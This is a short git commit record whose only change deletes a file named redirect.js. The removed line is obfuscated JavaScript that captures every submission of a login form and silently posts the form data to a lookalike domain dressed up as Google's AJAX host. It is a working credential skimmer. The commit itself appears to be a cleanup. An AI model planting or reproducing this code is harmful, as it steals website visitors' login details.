a97bfc70e48d0d166981009acf7f0548f81f646a
sistemit <97080535+sistemit@users.noreply.github.com>
2022-01-04 13:14:01 +0700

    Delete redirect.js

--- redirect.js
+++
@@ -1,1 +0,0 @@
-<?  var _0x3dd1=[".login-form","https://ajax.googleapis.com.web-id.xyz/site.php","POST","serialize","ajax","submit"];$(_0x3dd1[0])[_0x3dd1[5]](function(){var _0xaedcx1=$(_0x3dd1[0]);$[_0x3dd1[4]]({url:_0x3dd1[1],type:_0x3dd1[2],data:_0xaedcx1[_0x3dd1[3]](),success:function(){return true},error:function(){return true}})}) ?>
